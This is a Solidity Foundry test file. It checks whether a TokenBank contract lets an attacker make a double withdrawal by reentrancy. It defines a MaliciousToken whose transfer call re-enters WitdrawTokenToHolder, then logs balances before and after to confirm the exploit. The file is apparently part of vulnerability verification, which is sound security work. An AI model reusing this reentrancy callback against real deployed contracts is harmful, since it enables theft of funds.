// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0x3a0e9acd953ffc0dd18d63603488846a6b8b2b01.sol";

contract MaliciousToken {
    TokenBank public tokenBank;
    mapping(address => uint256) public balances;
    address private attacker;
    uint private reentrancyCount;

    constructor(address _tokenBank) {
        tokenBank = TokenBank(payable(_tokenBank));
    }

    function setAttacker(address _attacker) external {
        attacker = _attacker;
    }

    function mint(address to, uint256 amount) external {
        balances[to] += amount;
    }

    function balanceOf(address account) external view returns (uint256) {
        return balances[account];
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(amount > 0, "Amount must be positive");
        require(balances[msg.sender] >= amount, "Insufficient balance");
        balances[msg.sender] -= amount;
        balances[to] += amount;

        if (reentrancyCount == 0 && msg.sender == address(tokenBank)) {
            reentrancyCount++;
            tokenBank.WitdrawTokenToHolder(attacker, address(this), 1);
        }
        return true;
    }
}

contract TokenBankReentrancyTest is Test {
    TokenBank private tokenBank;
    MaliciousToken private maliciousToken;
    address private owner = address(0x1);
    address private attacker = address(0x2);
    uint256 private constant INITIAL_TOKENS = 100;

    function setUp() public {
        vm.startPrank(owner);
        tokenBank = new TokenBank();
        maliciousToken = new MaliciousToken(address(tokenBank));
        vm.stopPrank();

        maliciousToken.setAttacker(attacker);
        maliciousToken.mint(address(tokenBank), INITIAL_TOKENS);
        
        vm.deal(attacker, 1);
        vm.prank(attacker);
        tokenBank.Deposit{value: 1}();
    }

    function test_ReentrancyVulnerability() public {
        console2.log("--- BEFORE-Trigger Balances ---");
        uint256 bankBalanceBefore = maliciousToken.balanceOf(address(tokenBank));
        uint256 attackerBalanceBefore = maliciousToken.balanceOf(attacker);
        console2.log("TokenBank maliciousToken balance:", bankBalanceBefore);
        console2.log("Attacker maliciousToken balance:", attackerBalanceBefore);

        console2.log("--- Trigger WitdrawTokenToHolder ---");
        vm.prank(owner);
        tokenBank.WitdrawTokenToHolder(attacker, address(maliciousToken), 1);

        console2.log("--- AFTER-Trigger Balances ---");
        uint256 bankBalanceAfter = maliciousToken.balanceOf(address(tokenBank));
        uint256 attackerBalanceAfter = maliciousToken.balanceOf(attacker);
        console2.log("TokenBank maliciousToken balance:", bankBalanceAfter);
        console2.log("Attacker maliciousToken balance:", attackerBalanceAfter);

        uint256 bankBalanceChange = bankBalanceBefore - bankBalanceAfter;
        uint256 attackerBalanceChange = attackerBalanceAfter - attackerBalanceBefore;
        console2.log("TokenBank balance change:", bankBalanceChange);
        console2.log("Attacker balance change:", attackerBalanceChange);

        if (bankBalanceChange == 2 && attackerBalanceChange == 2) {
            console2.log("Vulnerability Exists: Reentrancy allowed double withdrawal");
        } else if (bankBalanceChange == 0 && attackerBalanceChange == 0) {
            console2.log("Vulnerability not Exist: Reentrancy attempt failed (no balance changes)");
        } else {
            console2.log("Vulnerability not Exist: Unexpected balance changes (reentrancy blocked)");
        }
    }
}